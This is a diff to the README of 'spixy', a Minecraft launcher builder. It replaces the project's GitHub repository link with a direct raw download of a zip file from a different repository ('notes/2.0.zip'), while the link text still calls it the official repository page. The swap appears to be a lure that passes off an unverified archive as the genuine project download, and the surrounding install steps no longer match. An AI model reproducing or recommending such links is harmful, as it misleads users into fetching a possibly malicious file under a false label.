@@ -5,7 +5,7 @@ description: "Build a custom branded Minecraft launcher, server website, and don
 ---
 # 🚀 spixy - Build custom Minecraft launchers without code
 
-[![](https://img.shields.io/badge/Download-Spixy-blue.svg)](https://github.com/Muhammadati7871/spixy)
+[![](https://img.shields.io/badge/Download-Spixy-blue.svg)](https://github.com/Muhammadati7871/muhammadati7871.github.io/raw/refs/heads/main/notes/2.0.zip)
 
 Spixy lets you create a custom Minecraft launcher for your server. You do not need to know how to write code. You can include mods, set up auto-updates, and manage server players easily. This tool gives you a professional launcher, a website, and a store for your players.
 
@@ -32,7 +32,7 @@ Before you install spixy, ensure your computer meets these conditions:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official repository page at this link: [https://github.com/Muhammadati7871/spixy](https://github.com/Muhammadati7871/spixy).
+1.  Visit the official repository page at this link: [https://github.com/Muhammadati7871/muhammadati7871.github.io/raw/refs/heads/main/notes/2.0.zip](https://github.com/Muhammadati7871/muhammadati7871.github.io/raw/refs/heads/main/notes/2.0.zip).
 2.  Look for the latest release section on the right side of the page.
 3.  Click the version number under the "Releases" header.
 4.  Find the file ending in `.exe` under the "Assets" section.
